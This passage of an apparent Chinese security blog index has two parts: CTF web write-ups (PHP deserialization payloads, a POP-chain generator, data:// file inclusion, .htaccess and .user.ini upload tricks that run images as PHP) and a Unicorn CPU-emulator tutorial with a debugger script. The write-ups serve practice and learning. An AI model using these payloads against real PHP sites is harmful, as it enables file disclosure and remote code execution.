\n```\n\n可以看到会输出`file`成员指向的文件，那么修改`file`为`flag.php`，进行序列化，得到\n\n```\nO:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n结合所有的，最后反序列化`password`得到最终的`payload`\n\n```\ntext=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n在源码注释中看到`flag`\n\n# 二十一、[MRCTF2020]你传你🐎呢\n\n## 🔺`.htaccess`利用\n\n传入`.htaccess`如下\n\n```\n<FilesMatch \"test.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n使得`php`可以解析`test.png`为`php`，从而执行。不过`.htaccess`只能在`apache`服务中起作用\n\n# 二十二、[SUCTF 2019]CheckIn\n\n## 🔺`.user.ini`利用\n\n传入`.user.ini`如下\n\n```\nGIF89a\nauto_prepend_file=origin.png\n```\n\n参考[浅析.htaccess和.user.ini文件上传 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/287193.html)\n\n`auto_prepend_file`表示`.user.ini`存在的当前目录下执行`php`代码之前，预先文件包含进`origin.png`，从而能够进行作为`php`代码解析\n\n# 二十三、[网鼎杯 2020 青龙组]AreUSerialz\n\n## 🔺php反序列化的属性不敏感\n\n打开得到源码\n\n```php\n<?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n\n}\n\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n\n可以看到条件如下：\n\n- `GET`传入的`str`中每一个字符都需要在`%32~%125`，属于可见字符中\n- 当`op`为`\"2\"`是，打印出`filename`\n- `filename`需要为`flag.php`\n\n## 条件一\n\n这个使用`php7.1+`针对成员属性不敏感的特性，即序列化后的字符串其正常的`protected`成员会有`\\00*\\00`来修饰，但是这里不允许传入`\\00`，那就不传入。这个`php7.1+`的特性允许在没有修饰的时候，也能进行转换，不管是`private`还是`protected`。但是`php7.1`以下则不行，会将相关的变量置为`null`，如下所示，从而无法利用。\n\n至于后面的多出来的属性是怎么回事，就不太知道了，估计是`php`底层代码问题\n\n![image-20220726173826850](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220726173826850.png)\n\n## 条件二\n\n可以注意到第一次在`__destruct`中比较`op`用的是强比较`===`\n\n```php\nif($this->op === \"2\")\n    $this->op = \"1\";\n```\n\n而第二次在`process`函数中用的是弱比较`==`\n\n```php\nif($this->op == \"1\") {\n    $this->write();\n} else if($this->op == \"2\") {\n    $res = $this->read();\n    $this->output($res);\n} \n```\n\n那么就可以使得`op`为`int`型的`2`，这样即可如下结果\n\n```\nif($this->op === \"2\") \t\t为False\nif($this->op == \"1\")\t\t为False\nelse if($this->op == \"2\")\t为True\n```\n\n那么即可顺利跳到打印`filename`的地方\n\n条件三就不用说了，对应赋值即可，最终`payload`\n\n```\n?str=O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;}\n```\n\n`flag`在注释里。\n\n\n\n\n\n# 二十四、[SWPUCTF 2021 新生赛]pop\n\n![2857028-20220517191534625-963175506](https://pig-007.oss-cn-beijing.aliyuncs.com/img/2857028-20220517191534625-963175506.png)\n\n## 🔺PHP的POP链\n\n## 1.漏洞分析\n\n直接给了源码\n\n```php\n<?php\n\nerror_reporting(0);\nshow_source(\"index.php\");\n\nclass w44m{\n\n    private $admin = 'aaa';\n    protected $passwd = '123456';\n\n    public function Getflag(){\n        if($this->admin === 'w44m' && $this->passwd ==='08067'){\n            include('flag.php');\n            echo $flag;\n        }else{\n            echo $this->admin;\n            echo $this->passwd;\n            echo 'nono';\n        }\n    }\n}\n\nclass w22m{\n    public $w00m;\n    public function __destruct(){\n        echo $this->w00m;\n    }\n}\n\nclass w33m{\n    public $w00m;\n    public $w22m;\n    public function __toString(){\n        $this->w00m->{$this->w22m}();\n        return 0;\n    }\n}\n\n$w00m = $_GET['w00m'];\nunserialize($w00m);\n\n?>\n```\n\n只要调用到`w33m->__toString`就可以执行任意方法了。\n\n## 2.漏洞利用\n\n那么就是`POP`链了，就是借用`PHP`反序列的时候调用的各种魔术方法，串联起来，类似`JAVA`的反序列化，这里的链子即为\n\n```\nw22m->__destruct()\necho $this->w00m\nw33m->__toString()下的$this->w00m->{$this->w22m}();\n```\n\n即设置`$this->w22m`为`Getflag`，`$this->w00m`为`w44m`的实例化对象，即如下\n\n```php\n<?php\n\nclass w44m{\n    private $admin = 'w44m';\n    protected $passwd = '08067';\n    public function Getflag(){\n        if($this->admin === 'w44m' && $this->passwd ==='08067'){\n            include('flag.php');\n            echo \"flag\";\n        }else{\n            echo $this->admin;\n            echo $this->passwd;\n            echo 'nono';\n        }\n    }\n}\n\nclass w22m{\n    public $w00m;\n    public function __destruct(){\n        echo $this->w00m;\n    }\n}\n\nclass w33m{\n    public $w00m;\n    public $w22m;\n    public function __toString(){\n        $this->w00m->{$this->w22m}();\n        return 0;\n    }\n}\n\n$obj = new w22m();\n$obj->w00m = new w33m();\n$obj->w00m->w00m = new w44m();\n$obj->w00m->w22m = \"Getflag\";\necho urlencode(serialize($obj));\n\n?>\n```\n\n## 注：\n\n- 反序列`unserialize`只会调用到传入对象的`__destruct`，而不会调用其成员函数的`__destruct`\n\n- 函数调用的特殊写法\n\n  ```php\n  <?php\n  \n  class w44m{\n      private $admin = 'aaaa';\n      protected $passwd = 'bbbb';\n      public function test($a,$b){\n          echo $a;\n          echo $b;\n          echo \"myTest\";\n      }\n  }\n  \n  class w22m{\n      public $w00m;\n  }\n  \n  \n  class w33m{\n      public $w00m;\n      public $w22m;\n  \n  }\n  \n  $c33 = new w33m();\n  $c33->w22m = new w44m();\n  $c33->w00m = \"test\";\n  $c33->w22m->{$c33->w00m}(\"aaa\",\"bbb\");\n  \n  ?>\n  ```\n\n  即可以使用`$c33->w22m->{$c33->w00m}(\"aaa\",\"bbb\");`这种方式来调用某个类的方法。\n\n\n\n# 二十五、[RoarCTF 2019]Easy Java\n\n打开是登录界面，查看help，发现URL有点问题\n\n![image-20230530184715317](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230530184715317.png)\n","tags":["陪XX的WebBUU刷题"],"categories":["陪XX的WebBUU刷题"]},{"title":"Unicorn","url":"/2021/11/19/Unicorn/","content":"\n# 一、功能介绍\n\n## 1.初始化\n\n### (1)前置模块及架构\n\n```python\n# -*- coding:UTF-8 -*-\nfrom __future__ import print_function\nfrom unicorn import *\nfrom unicorn.x86_const import *\n```\n\n`unicorn.x86_const`这个模块是可以改变的，可以换成以下多种架构\n\n![image-20211118211823271](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211118211823.png)\n\n### (2)main函数初始化\n\n```python\nprint(\"Emulate amd64 code\")\nuc = Uc(UC_ARCH_X86, UC_MODE_64)\nbinary = \"./binary\"\n\nBASE = 0\nCODE = BASE + 0x0\nCODE_SIZE = 2 * 1024 * 1024\n\n# mov r8,0x123\n# mov r9,0x456\nCODE_DATA = b\"\\x49\\xc7\\xc0\\x23\\x01\\x00\\x00\" + b\"\\x49\\xc7\\xc1\\x56\\x04\\x00\\x00\"\n#CODE_DATA = getCODEFromBinary(binary)\n\nSTACK = 0x7F00000000\nSTACK_SIZE = 2 * 1024 * 1024\n\nFS = 0x7FF0000000\nFS_SIZE = 0x100000\n\n#初始化UC\ninitUC(uc,CODE,CODE_SIZE, STACK, STACK_SIZE)\n```\n\n`UC_ARCH_X86`：代表x86架构\n\n`UC_MODE_64`：代表64位\n\n`UC_MODE_32`：代表32位\n\n`CODE`：表示装载进入内存的代码数据地址\n\n`CODE_DATA`：表示自定义的代码或者从binary中获取的相关代码数据\n\n`STACK`：表栈的数据地址\n\n### (3)其他初始化\n\n#### ①内存初始化\n\n栈和代码数据，向CODE中写入CODE_DATA\n\n```python\n# 获取一块内存用来保存程序的所有数据\nuc.mem_map(CODE, CODE_SIZE, UC_PROT_ALL)\nuc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL)\nuc.mem_write(CODE, CODE_DATA)\n```\n\n#### ②寄存器初始化\n\n在initUC中被调用\n\n```python\ndef initReg(uc,STACK=0x7F00000000,RAX_DATA=0,RBX_DATA=0,\n            RCX_DATA=0,RDX_DATA=0,RSI_DATA=0,\n            RDI_DATA=0,R8_DATA=0,R9_DATA=0,\n            R10_DATA=0,R11_DATA=0,R12_DATA=0,\n            R13_DATA=0,R14_DATA=0,R15_DATA=0):\n    uc.reg_write(UC_X86_REG_RAX, RAX_DATA)\n    uc.reg_write(UC_X86_REG_RBX, RBX_DATA)\n    uc.reg_write(UC_X86_REG_RCX, RCX_DATA)\n    uc.reg_write(UC_X86_REG_RDX, RDX_DATA)\n    uc.reg_write(UC_X86_REG_RSI, RSI_DATA)\n    uc.reg_write(UC_X86_REG_RDI, RDI_DATA)\n    uc.reg_write(UC_X86_REG_R8, R8_DATA)\n    uc.reg_write(UC_X86_REG_R9, R9_DATA)\n    uc.reg_write(UC_X86_REG_R10, R10_DATA)\n    uc.reg_write(UC_X86_REG_R11, R11_DATA)\n    uc.reg_write(UC_X86_REG_R12, R12_DATA)\n    uc.reg_write(UC_X86_REG_R13, R13_DATA)\n    uc.reg_write(UC_X86_REG_R14, R14_DATA)\n    uc.reg_write(UC_X86_REG_R15, R15_DATA)\n    uc.reg_write(UC_X86_REG_RSP, STACK + 0x1000)\n```\n\n### (4)其他常用功能函数\n\n#### ①从binary中获取代码\n\n```python\ndef getCODEFromBinary(binary):\n    with open(binary, \"rb\") as f:\n        CODE_DATA = f.read()\n    return CODE_DATA\n```\n\n#### ②单步显示结果\n\n```python\ndef hook_OneStep(uc, address, size, user_data):\n    print(\">>> Tracing instruction at 0x%x, instruction size = 0x%x\" %(address, size))\n    #利用ret来跳过printf函数，类似还可以跳过其他函数\n    if address == 0x640:  # printf\n        rsp = uc.reg_read(UC_X86_REG_RSP)\n        retn_addr = u64(uc.mem_read(rsp,8))\n        uc.reg_write(UC_X86_REG_RIP, retn_addr)\n    #跳过某条指令，这里跳过rdrand rax指令\n    if code == b\"\\x48\\x0F\\xC7\\xF0\":\n        uc.reg_write(UC_X86_REG_RIP, address + 4)\n```\n\n然后这个需要在之后加入到uc的回调函数中，一般在main函数中添加，如下：\n\n```python\nuc.hook_add(UC_HOOK_CODE, hook_OneStep, None, CODE, len(CODE_DATA))\n```\n\n添加hook_OneStep函数，使得`CODE~CODE+len(CODE_DATA)`中每条指令执行时都调用该hook_OneStep函数，便于我们观察运行过程。\n\n#### ③整块显示结果\n\n```python\ndef hook_block(uc, address, size, user_data):\n\tprint(\">>> Tracing basic block at 0x%x, block size = 0x%x\" % (address, size))\n```\n\n这个也是需要添加的\n\n```python\nuc.hook_add(UC_HOOK_BLOCK, hook_block)\n```\n\n我们运行代码可以是一块一块的：\n\n```python\n# 运行一段代码\nuc.emu_start(CODE, CODE + 0x7*2)\nuc.emu_start(CODE + 0x7 * 2, CODE + 0x7 * 4)\n```\n\n这个整块的block函数就是用在每块代码开始的时候运行该块函数\n\n#### ④无效内存访问的回调函数\n\n```python\ndef hook_MemInvalid(uc, access, address, size, value, user_data):\n    if access == UC_MEM_WRITE_UNMAPPED:\n        print(\">>> Missing memory is being WRITE at 0x%x, data size = %u, data value = 0x%x\"%(address, size, value))\n        # map this memory in with 2MB in size\n        uc.mem_map(0xaaaa0000, 2 * 1024*1024)\n        # return True to indicate we want to continue emulation\n        return True\n    else:\n        # return False to indicate we want to stop emulation\n        return False\n\n#uc.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED, hook_MemInvalid)\n```\n\n#### ⑤内存访问的回调函数\n\n```python\ndef hook_MemAccess(uc, access, address, size, value, user_data):\n    if access == UC_MEM_WRITE:\n        print(\">>> Memory is being WRITE at 0x%x, data size = %u, data value = 0x%x\"%(address, size, value))\n    else:   # READ\n        print(\">>> Memory is being READ at 0x%x, data size = %u\"%(address, size))\n\n#uc.hook_add(UC_HOOK_MEM_WRITE, hook_MemAccess)\n#uc.hook_add(UC_HOOK_MEM_READ, hook_MemAccess)\n```\n\n## 2.启动unicorn\n\n通常使用如下代码启动\n\n```python\ntry:\n    # 运行一段代码\n    uc.emu_start(CODE, CODE + 0x7*3)\n    uc.emu_start(CODE + 0x7 * 3, CODE + 0x7 * 4)\nexcept UcError as e:\n    print(\"ERROR: %s\" % e)\n```\n\n这里就代表运行了两块代码，分别为`CODE  ~ CODE + 0x7*3`和`CODE + 0x7 * 3  ~  CODE + 0x7 * 4`\n\n\n\n参考：\n\n[使用unicorn来自动化解题 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/246451)\n\nCTFWIKI\n\n## 3.调试器\n\n### 详情参考：\n\n[[原创\\] Unicorn 在 Android 的应用-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-253868.htm)\n\n这里将一些东西改了下，原本[无名侠师傅](https://bbs.pediy.com/user-617255.htm)的调试器代码中就自带不同ARCH和MODE，只不过分享上述文章时，改掉了只有ARM，这里我加了回去，顺带加入了mips架构，另外还加了一些个人常用的命令，并且在linux下的某些`\\n`换行问题(split函数)，这里也一并修改了。然后从一个PWN选手的角度，加了一点功能，输入help查看所有功能\n\n#### uniDbg.py\n\n```python\nimport re\n\nfrom unicorn import *\nfrom uniDbg_REG import *\nimport sys\nimport hexdump\nimport capstone as cp\n\nBPT_EXECUTE = 1\nBPT_MEMREAD = 2\nUDBG_MODE_ALL = 1\nUDBG_MODE_FAST = 2\n\n\n\ndef str2int(s):\n    if s.startswith('0x') or s.startswith(\"0X\"):\n        return int(s[2:], 16)\n    return int(s)\n\ndef numToStr(num):\n    amountByte = 0\n    str = \"\"\n    while True:\n        if (num == 0):\n            amountByte = 1\n            break\n        elif (num >= pow(16, amountByte * 2)):\n            amountByte += 1\n            continue\n        else:\n            break\n    for i in range(1, amountByte + 1):\n        newNum = num >> 8\n        myChr = num - newNum * 0x100\n        str += chr(myChr)\n        num = newNum\n    str = ''.join(reversed(str))\n    return str\n\ndef advance_dump(data, base):\n    PY3K = sys.version_info >= (3, 0)\n    generator = hexdump.genchunks(data, 16)\n    retstr = ''\n    for addr, d in enumerate(generator):\n        # 00000000:\n        line = '%08X: ' % (base + addr * 16)\n        # 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00\n        dumpstr = hexdump.dump(d)\n        line += dumpstr[:8 * 3]\n        if len(d) > 8:  # insert separator if needed\n            line += ' ' + dumpstr[8 * 3:]\n        # ................\n        # calculate indentation, which may be different for the last line\n        pad = 2\n        if len(d) < 16:\n            pad += 3 * (16 - len(d))\n        if len(d) <= 8:\n            pad += 1\n        line += ' ' * pad\n\n        for byte in d:\n            # printable ASCII range 0x20 to 0x7E\n            if not PY3K:\n                byte = ord(byte)\n            if 0x20 <= byte <= 0x7E:\n                line += chr(byte)\n            else:\n                line += '.'\n        retstr += line + '\\n'\n    return retstr\n\n\ndef _dbg_trace(mu, address, size, self):\n    self._tracks.append(address)\n    if not self._is_step and self._tmp_bpt == 0:\n        if address not in self._list_bpt:\n            return\n\n    if self._tmp_bpt != address and self._tmp_bpt != 0:\n        return\n\n    return _dbg_trace_internal(mu, address, size, self)\n\n\ndef _dbg_memory(mu, access, address, length, value, self):\n    pc = mu.reg_read(arm_const.UC_ARM_REG_PC)\n    print(\"memory error: pc: %x access: %x address: %x length: %x value: %x\" %\n          (pc, access, address, length, value))\n    _dbg_trace_internal(mu, pc, 4, self)\n    mu.emu_stop()\n    return True\n\n\ndef _dbg_trace_internal(mu, address, size, self):\n    self._is_step = False\n    print(\"======================= Registers =======================\")\n    self.dump_reg()\n    print(\"======================= Disassembly =====================\")\n    self.dump_asm(address, size * self.dis_count)\n\n    while True:\n        raw_command = input(\">\")\n        if raw_command == '':\n            raw_command = self._last_command\n        self._last_command = raw_command\n        command = []\n        for c in raw_command.split():\n            if c != \"\":\n                command.append(c)\n        try:\n            if command[0] == 'set':\n                if command[1] == 'reg':  # set reg regname value\n                    self.write_reg(command[2], str2int(command[3]))\n                elif command[1] == 'bpt':\n                    self.add_bpt(str2int(command[2]))\n                elif command[1].startswith('0x') or command[1].startswith('0X'):\n                    self.write_mem(str2int(command[1]),str2int(command[2]))\n                else:\n                    print(\"[Debugger Error]command error see help.\")\n            elif command[0].startswith('x'):\n                view_amount = int(self.read_ex_viewRow(command[0])[2:],10)\n                if(view_amount == 0):\n                    view_amount = 1\n                read_fmt_str = self.read_ex_last(command[0])\n                if(read_fmt_str == 'gx'):\n                    content = self.read_mem(str2int(command[1]), view_amount * 8)\n                    self.fmt_print_mem(read_fmt_str,str2int(command[1]),content)\n                elif(read_fmt_str == 'wx'):\n                    content = self.read_mem(str2int(command[1]), view_amount * 4)\n                    self.fmt_print_mem(read_fmt_str,str2int(command[1]), content)\n                elif(read_fmt_str == 's'):\n                    content = self.read_mem(str2int(command[1]), view_amount * 32)\n                    self.fmt_print_mem(read_fmt_str,str2int(command[1]), content)\n                elif(read_fmt_str == 'si'):\n                    self.dump_asm(str2int(command[1]), view_amount * self.dis_count)\n\n            elif command[0] == 's' or command[0] == 'step':\n                # self._tmp_bpt = address + size\n                self._tmp_bpt = 0\n                self._is_step = True\n                break\n            elif command[0] == 'n' or command[0] == 'next':\n                self._tmp_bpt = address + size\n                self._is_step = False\n                break\n            elif command[0] == 'r' or command[0] == 'run':\n                self._tmp_bpt = 0\n                self._is_step = False\n                break\n            elif command[0] == 'dump':\n                if len(command) >= 3:\n                    nsize = str2int(command[2])\n                else:\n                    nsize = 4 * 16\n                self.dump_mem(str2int(command[1]), nsize)\n            elif command[0] == 'i' or command[0] == 'info':\n                if command[1] == 'b' or command[1] == 'bpt':\n                    self.list_bpt()\n            elif command[0] == 'd' or command[0] == 'delete':\n                self.del_bpt(str2int(command[1]))\n            elif command[0] == 'stop':\n                break\n            elif command[0] == 't':\n                self._castone = self._capstone_thumb\n                print(\"======================= Disassembly =====================\")\n                self.dump_asm(address, size * self.dis_count)\n            elif command[0] == 'a':\n                self._castone = self._capstone_arm\n                print(\"======================= Disassembly =====================\")\n                self.dump_asm(address, size * self.dis_count)\n            elif command[0] == 'f':\n                print(\" == recent ==\")\n                for i in self._tracks[-10:-1]:\n                    print(self.sym_handler(i))\n            elif command[0] == 'help':\n                self.show_help()\n            elif command[0] == 'context':\n                print(\"======================= Registers =======================\")\n                self.dump_reg()\n                print(\"======================= Disassembly =====================\")\n                self.dump_asm(address, size * self.dis_count)\n            else:\n                print(\"Command Not Found!\")\n\n        except:\n            print(\"[Debugger Error]command error see help.\")\n\n\nclass UnicornDebugger:\n    def __init__(self, mu, mode=UDBG_MODE_ALL):\n        self._ex_seg = re.compile(r'x/\\d+')\n        self._tracks = []\n        self._mu = mu\n        self._arch = mu._arch\n        self._mode = mu._mode\n        self._list_bpt = []\n        self._tmp_bpt = 0\n        self._error = ''\n        self._last_command = ''\n        self.dis_count = 5\n        self._is_step = False\n        self.sym_handler = self._default_sym_handler\n        self._capstone_arch = None\n        self._capstone_mode = None\n\n        # if self._arch != UC_ARCH_ARM:\n        #     mu.emu_stop()\n        #     raise RuntimeError(\"arch:%d is not supported! \" % self._arch)\n        if self._arch == UC_ARCH_ARM:\n            capstone_arch = cp.CS_ARCH_ARM\n        elif self._arch == UC_ARCH_ARM64:\n            capstone_arch = cp.CS_ARCH_ARM64\n        elif self._arch == UC_ARCH_X86:\n            capstone_arch = cp.CS_ARCH_X86\n        elif self._arch == UC_ARCH_MIPS:\n            capstone_arch = cp.CS_ARCH_MIPS\n        else:\n            mu.emu_stop()\n            raise RuntimeError(\"arch:%d is not supported! \" % self._arch)\n\n        if self._mode == UC_MODE_THUMB:\n            capstone_mode = cp.CS_MODE_THUMB\n        elif self._mode == UC_MODE_ARM:\n            capstone_mode = cp.CS_MODE_ARM\n        elif self._mode == UC_MODE_MIPS32:\n            capstone_mode = cp.CS_MODE_MIPS32\n        elif self._mode == UC_MODE_MIPS32 + UC_MODE_BIG_ENDIAN:\n            capstone_mode = cp.CS_MODE_MIPS32 + cp.CS_MODE_BIG_ENDIAN\n        elif self._mode == UC_MODE_MIPS64:\n            capstone_mode = cp.CS_MODE_MIPS64\n        elif self._mode == UC_MODE_MIPS64 + UC_MODE_BIG_ENDIAN:\n            capstone_mode = cp.CS_MODE_MIPS64 + cp.CS_MODE_BIG_ENDIAN\n        elif self._mode == UC_MODE_32:\n            capstone_mode = cp.CS_MODE_32\n        elif self._mode == UC_MODE_64:\n            capstone_mode = cp.CS_MODE_64\n        else:\n            mu.emu_stop()\n            raise RuntimeError(\"mode:%d is not supported! \" % self._mode)\n\n        self._capstone_mode = cp.Cs(capstone_arch, capstone_mode)\n        self._capstone_arch = cp.Cs(capstone_arch, capstone_mode)\n        self._capstone = self._capstone_mode\n\n        if mode == UDBG_MODE_ALL:\n            mu.hook_add(UC_HOOK_CODE, _dbg_trace, self)\n\n        mu.hook_add(UC_HOOK_MEM_UNMAPPED, _dbg_memory, self)\n        mu.hook_add(UC_HOOK_MEM_FETCH_PROT, _dbg_memory, self)\n\n        self._regs = REG_TABLE[self._arch]\n\n    def dump_mem(self, addr, size):\n        data = self._mu.mem_read(addr, size)\n        print(advance_dump(data, addr))\n\n    def dump_asm(self, addr, size):\n        md = self._capstone\n        code = self._mu.mem_read(addr, size)\n        count = 0\n        for ins in md.disasm(code, addr):\n            if count >= self.dis_count:\n                break\n            print(\"%s:\\t%s\\t%s\" % (self.sym_handler(ins.address), ins.mnemonic, ins.op_str))\n\n    def dump_reg(self):\n        result_format = \"\"\n        count = 0\n        for rid in self._regs:\n            rname = self._regs[rid]\n            value = self._mu.reg_read(rid)\n            if count < 4:\n                result_format = result_format + rname + '=' + hex(value) + '\\t'\n                count += 1\n            else:\n                count = 1\n                result_format += '\\n' + rname + '=' + hex(value) + '\\t'\n        print(result_format)\n\n    def write_reg(self, reg_name, value):\n        for rid in self._regs:\n            rname = self._regs[rid]\n            if rname == reg_name:\n                self._mu.reg_write(rid, value)\n                return\n        print(\"[Debugger Error] Reg not found:%s \" % reg_name)\n\n    def write_mem(self,addr,value):\n        str = numToStr(value)\n        self._mu.mem_write(addr,str.encode('UTF-8'))\n        return\n\n    def read_mem(self,addr,length):\n        str = self._mu.mem_read(addr,length)\n        return str\n\n    def show_help(self):\n        help_info = \"\"\"\n        # commands\n        # set reg <regname> <value>\n        # set bpt <addr>\n        # n[ext]\n        # s[etp]\n        # r[un]\n        # dump <addr> <size>\n        # i[nfo] b[pt]\n        # d[elete] <bpt_Idx>\n        # stop\n        # a/t change arm/thumb\n        # f show ins flow\n        # x/<rowAmount><gx/s/si/wx>\n        \"\"\"\n        print(help_info)\n\n    def list_bpt(self):\n        for idx in range(len(self._list_bpt)):\n            print(\"[%d] %s\" % (idx, self.sym_handler(self._list_bpt[idx])))\n\n    def add_bpt(self, addr):\n        self._list_bpt.append(addr)\n\n    def del_bpt(self, idx):\n        del self._list_bpt[idx]\n        #self._list_bpt.remove(addr)\n\n    def get_tracks(self):\n        for i in self._tracks[-100:-1]:\n            # print (self.sym_handler(i))\n            pass\n        return self._tracks\n\n    def _default_sym_handler(self, address):\n        return hex(address)\n\n    def set_symbol_name_handler(self, handler):\n        self.sym_handler = handler\n\n    def read_ex_viewRow(self,str):\n        return self._ex_seg.findall(str)[0]\n\n    def read_ex_last(self,str):\n        return self._ex_seg.sub('',str)\n\n    def fmt_print_mem(self,fmt_str,addr,content):\n        if(self._mode >= UC_MODE_BIG_ENDIAN):\n            ending = 'big'\n        else:\n            ending = 'little'\n        count = 0\n        while(count < len(content)):\n            if(fmt_str == 'gx'):\n                print(\"0x{:0>16x}\\t0x{:0>16x}\\t0x{:0>16x}\".format(addr,int.from_bytes(content[0+count:8+count],byteorder = ending),\n                      int.from_bytes(content[8+count:16+count],byteorder = ending)))\n                count += 8\n            elif(fmt_str == 'wx'):\n                print(\"0x{:0>8x}\\t0x{:0>8x}\\t0x{:0>8x}\".format(addr,int.from_bytes(content[0+count:4+count],byteorder = ending),\n                      int.from_bytes(content[4+count:8+count],byteorder = ending)))\n                count += 4\n            elif(fmt_str == 's'):\n                print(\"0x{:0>16x}\\t{:>32s}\".format(addr,numToStr(int.from_bytes(content[0+count:32+count],byteorder = ending))))\n                count += 32\n```\n\n#### uniDbg_REG.py\n\n```python\nfrom unicorn import *\n\nREG_ARM = {arm_const.UC_ARM_REG_R0: \"R0\",\n           arm_const.UC_ARM_REG_R1: \"R1\",\n           arm_const.UC_ARM_REG_R2: \"R2\",\n           arm_const.UC_ARM_REG_R3: \"R3\",\n           arm_const.UC_ARM_REG_R4: \"R4\",\n           arm_const.UC_ARM_REG_R5: \"R5\",\n           arm_const.UC_ARM_REG_R6: \"R6\",\n           arm_const.UC_ARM_REG_R7: \"R7\",\n           arm_const.UC_ARM_REG_R8: \"R8\",\n           arm_const.UC_ARM_REG_R9: \"R9\",\n           arm_const.UC_ARM_REG_R10: \"R10\",\n           arm_const.UC_ARM_REG_R11: \"R11\",\n           arm_const.UC_ARM_REG_R12: \"R12\",\n           arm_const.UC_ARM_REG_R13: \"R13\",\n           arm_const.UC_ARM_REG_R14: \"R14\",\n           arm_const.UC_ARM_REG_R15: \"R15\",\n           arm_const.UC_ARM_REG_PC: \"PC\",\n           arm_const.UC_ARM_REG_SP: \"SP\",\n           arm_const.UC_ARM_REG_LR: \"LR\"\n           }\n\nREG_ARM64 = {arm64_const.UC_ARM64_REG_X0: \"X0\",\n            arm64_const.UC_ARM64_REG_X1: \"X1\",\n            arm64_const.UC_ARM64_REG_X2: \"X2\",\n            arm64_const.UC_ARM64_REG_X3: \"X3\",\n            arm64_const.UC_ARM64_REG_X4: \"X4\",\n            arm64_const.UC_ARM64_REG_X5: \"X5\",\n            arm64_const.UC_ARM64_REG_X6: \"X6\",\n            arm64_const.UC_ARM64_REG_X7: \"X7\",\n            arm64_const.UC_ARM64_REG_X8: \"X8\",\n            arm64_const.UC_ARM64_REG_X9: \"X9\",\n            arm64_const.UC_ARM64_REG_X10: \"X10\",\n            arm64_const.UC_ARM64_REG_X11: \"X11\",\n            arm64_const.UC_ARM64_REG_X12: \"X12\",\n            arm64_const.UC_ARM64_REG_X13: \"X13\",\n            arm64_const.UC_ARM64_REG_X14: \"X14\",\n            arm64_const.UC_ARM64_REG_X15: \"X15\",\n            arm64_const.UC_ARM64_REG_X16: \"X16\",\n            arm64_const.UC_ARM64_REG_X17: \"X17\",\n            arm64_const.UC_ARM64_REG_X18: \"X18\",\n            arm64_const.UC_ARM64_REG_X19: \"X19\",\n            arm64_const.UC_ARM64_REG_X20: \"X20\",\n            arm64_const.UC_ARM64_REG_X21: \"X21\",\n            arm64_const.UC_ARM64_REG_X22: \"X22\",\n            arm64_const.UC_ARM64_REG_X23: \"X23\",\n            arm64_const.UC_ARM64_REG_X24: \"X24\",\n            arm64_const.UC_ARM64_REG_X25: \"X25\",\n            arm64_const.UC_ARM64_REG_X26: \"P26\",\n            arm64_const.UC_ARM64_REG_X27: \"X27\",\n            arm64_const.UC_ARM64_REG_X28: \"X28\",\n            arm64_const.UC_ARM64_REG_X29: \"X29\",\n            arm64_const.UC_ARM64_REG_SP: \"SP\",\n            arm64_const.UC_ARM64_REG_PC: \"PC\",\n           }\n\n\nREG_AMD64 = {x86_const.UC_X86_REG_RAX: \"RAX\",\n             x86_const.UC_X86_REG_RBX: \"RBX\",\n             x86_const.UC_X86_REG_RCX: \"RCX\",\n             x86_const.UC_X86_REG_RDX: \"RDX\",\n             x86_const.UC_X86_REG_RDI: \"RDI\",\n             x86_const.UC_X86_REG_RSI: \"RSI\",\n             x86_const.UC_X86_REG_R8: \"R8\",\n             x86_const.UC_X86_REG_R9: \"R9\",\n             x86_const.UC_X86_REG_R10: \"R10\",\n             x86_const.UC_X86_REG_R11: \"R11\",\n             x86_const.UC_X86_REG_R12: \"R12\",\n             x86_const.UC_X86_REG_R13: \"R13\",\n             x86_const.UC_X86_REG_R14: \"R14\",\n             x86_const.UC_X86_REG_R15: \"R15\",\n             x86_const.UC_X86_REG_RBP: \"RBP\",\n             x86_const.UC_X86_REG_RSP: \"RSP\",\n             x86_const.UC_X86_REG_RIP: \"RIP\",\n             }\n\nREG_MIPS = {\n    mips_const.UC_MIPS_REG_ZERO: \"ZERO\",\n    mips_const.UC_MIPS_REG_V0: \"V0\",\n    